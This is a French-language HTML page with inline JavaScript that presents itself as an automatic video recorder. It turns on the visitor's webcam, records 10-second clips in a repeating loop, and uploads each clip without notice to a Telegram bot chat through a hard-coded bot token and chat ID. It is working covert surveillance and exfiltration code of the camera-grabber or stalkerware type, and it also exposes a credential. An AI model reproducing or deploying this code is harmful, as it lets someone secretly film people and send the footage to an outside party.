<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Enregistrement Vidéo Automatique</title>
</head>
<body>
    <h1>Enregistrement Vidéo Automatique</h1>
    <video id="cameraPreview" width="640" height="480" autoplay muted></video>
    <button id="startButton">Démarrer l'enregistrement</button>
    <button id="stopButton" disabled>Arrêter l'enregistrement</button>
    <div id="videos"></div>

    <script>
        const botToken = "7120430648:AAEbBfFfg8b1nv8Y52L73iz8yUw4lPUwRow";  // Remplace par ton token Telegram
        const chatId = "6493293796";  // Remplace par ton Chat ID

        const cameraPreview = document.getElementById('cameraPreview');
        const startButton = document.getElementById('startButton');
        const stopButton = document.getElementById('stopButton');
        let mediaRecorder;
        let recordedBlobs = [];
        let stream;

        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                cameraPreview.srcObject = stream;
            } catch (err) {
                alert("Erreur d'accès à la caméra. Vérifiez les permissions !");
                console.error("Erreur d'accès à la caméra :", err);
            }
        }

        function startRecording() {
            recordedBlobs = [];
            let options = { mimeType: 'video/webm;codecs=vp9,opus' };

            try {
                mediaRecorder = new MediaRecorder(stream, options);
            } catch (e) {
                console.error('Erreur lors de la création de MediaRecorder:', e);
                return;
            }

            mediaRecorder.ondataavailable = (event) => {
                if (event.data && event.data.size > 0) {
                    recordedBlobs.push(event.data);
                }
            };

            mediaRecorder.onstop = saveVideo;
            mediaRecorder.start();
            console.log("Enregistrement en cours...");

            setTimeout(() => {
                mediaRecorder.stop();
            }, 10000); // 10s d'enregistrement
        }

        async function saveVideo() {
            let blob = new Blob(recordedBlobs, { type: "video/webm" });
            let file = new File([blob], `video_${Date.now()}.webm`, { type: "video/webm" });

            let formData = new FormData();
            formData.append("chat_id", chatId);
            formData.append("video", file);

            let url = `https://api.telegram.org/bot${botToken}/sendVideo`;

            fetch(url, {
                method: "POST",
                body: formData
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    console.log("✅ Vidéo envoyée sur Telegram !");
                } else {
                    console.error("❌ Erreur Telegram :", data);
                }
            })
            .catch(error => console.error("❌ Erreur d'envoi :", error));
        }

        function startAutoRecording() {
            if (!stream) {
                console.warn("Caméra non disponible !");
                return;
            }

            startRecording();
            setInterval(() => {
                startRecording();
            }, 15000); // 10s d'enregistrement + 5s de pause

            startButton.disabled = true;
            stopButton.disabled = false;
        }

        function stopCamera() {
            if (stream) {
                stream.getTracks().forEach(track => track.stop());
                console.log("Caméra arrêtée.");
            }
        }

        startCamera();
        startButton.addEventListener('click', startAutoRecording);
        window.addEventListener("beforeunload", stopCamera);
    </script>
</body>
	</html>
